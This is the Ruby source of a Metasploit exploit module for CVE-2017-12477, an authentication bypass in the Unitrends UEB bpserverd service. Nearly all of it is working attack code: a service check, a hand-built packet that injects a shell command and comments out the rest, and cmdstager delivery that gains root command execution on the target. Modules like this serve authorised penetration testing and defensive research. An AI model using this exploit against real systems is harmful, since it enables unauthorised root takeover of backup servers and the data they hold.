# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Unitrends UEB bpserverd authentication bypass RCE&#039;,
      &#039;Description&#039;    => %q{
       It was discovered that the Unitrends bpserverd proprietary protocol, as exposed via xinetd,
       has an issue in which its authentication can be bypassed.  A remote attacker could use this
       issue to execute arbitrary commands with root privilege on the target system.
      },
      &#039;Author&#039;         =>
        [
          &#039;Jared Arave&#039;,  # @iotennui
          &#039;Cale Smith&#039;,   # @0xC413
          &#039;Benny Husted&#039;  # @BennyHusted
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039; => [ARCH_X86],
      &#039;CmdStagerFlavor&#039; => [ &#039;printf&#039; ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://support.unitrends.com/UnitrendsBackup/s/article/ka640000000CcZeAAK/000005755&#039;],
          [&#039;URL&#039;, &#039;https://nvd.nist.gov/vuln/detail/CVE-2017-12477&#039;],
          [&#039;CVE&#039;, &#039;2017-12477&#039;],
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;UEB 9.*&#039;, { } ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DefaultOptions&#039; => {
          &#039;SSL&#039; => false
        },
      &#039;DisclosureDate&#039;  => &#039;Aug 8 2017&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options([
        Opt::RPORT(1743)
      ])
    deregister_options(&#039;CMDSTAGER::DECODER&#039;, &#039;CMDSTAGER::FLAVOR&#039;)
  end

  def check
    s1 = connect(global = false)
    buf1  = s1.get_once(-1).to_s
    #parse out the bpd port returned
    bpd_port = buf1[-8..-3].to_i

    #check if it&#039;s a valid port number (1-65534)
    if bpd_port && bpd_port >= 1 && bpd_port <= 65535
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Safe
    end
  end

  def execute_command(cmd, opts = {})

    #append a comment, ignore everything after our cmd
    cmd = cmd + " #"

    # build the attack buffer...
    command_len = cmd.length + 3
    packet_len = cmd.length + 23
    data =  "\xa5\x52\x00\x2d"
    data << "\x00\x00\x00"
    data << packet_len
    data << "\x00\x00\x00"
    data << "\x01"
    data << "\x00\x00\x00"
    data << "\x4c"
    data << "\x00\x00\x00"
    data << command_len
    data << cmd
    data << "\x00\x00\x00"

    begin
      print_status("Connecting to xinetd for bpd port...")
      s1 = connect(global = false)
      buf1  = s1.get_once(-1).to_s

      #parse out the bpd port returned, we will connect back on this port to send our cmd
      bpd_port = buf1[-8..-3].to_i

      print_good("bpd port recieved: #{bpd_port}")
      vprint_status("Connecting to #{bpd_port}")

      s2 = connect(global = false, opts = {&#039;RPORT&#039;=>bpd_port})
      vprint_good(&#039;Connected!&#039;)

      print_status(&#039;Sending command buffer to xinetd&#039;)

      s1.put(data)
      s2.get_once(-1,1).to_s

      disconnect(s1)
      disconnect(s2)

    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      fail_with(Failure::Unreachable, "#{peer} - Connection to server failed")
    end

  end

  def exploit
    print_status("#{peer} - pwn&#039;ng ueb 9....")
    execute_cmdstager(:linemax => 200)
  end
end

